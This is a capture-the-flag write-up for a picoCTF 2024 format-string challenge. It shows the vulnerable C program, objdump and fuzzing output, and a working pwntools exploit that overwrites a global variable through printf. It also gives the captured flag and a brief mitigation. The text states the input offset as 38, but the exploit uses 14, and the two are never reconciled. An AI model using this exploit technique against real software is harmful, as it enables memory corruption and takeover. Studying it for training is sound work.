## CTF: picoCTF 2024

Challenge: Format String 2

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must *change* data in its memory!

## Solution

After running your inital checks, lets look at the behavior of the binary.

```jsx
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
a
Here's your input: a
sus = 0x21737573
You can do better!
```

We see we need to change "sus". Lets look at the source code to see what we need to change it to.

```jsx
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

We see that there's a format string vulnerability when receiving our input in buf. We also see that it's doing a check on sus to the value  0x67616c66. We almost have everything, but we need to know where we start reading our own buffer and the address of sus. After some fuzzing, you will see that we start reading our input at position 38. We can also do a objdump to find the address of sus.

```jsx
amichel2579-academy@webshell:~/format-string2$ objdump -t vuln | grep sus
0000000000404048 g     O .data  0000000000000004              sus
amichel2579-academy@webshell:~/format-string2$
```

```jsx
amichel2579-academy@webshell:~/format-string2$ ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
aaaaaaaaaaaaa%38$s
Here's your input: aaaaaaaaaaaaabu|
sus = 0x21737573
You can do better!
```

We now have everything we need to build our exploit.

### Exploit

```jsx
from pwn import *
elf = context.binary = ELF("./vuln")
p = process("./vuln")

#p = remote('chatelaine.cylabacademy.net', 38239)
sus = 0x404048
flag = 0x67616c66
payload = fmtstr_payload(14, {sus : flag})
#p.send("%14$p")
p.sendline(payload)
p.interactive()
```

## Flag

```jsx
academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}
```

## Mitigation

Don't trust the user, always limit the size properly and use format strings correctly.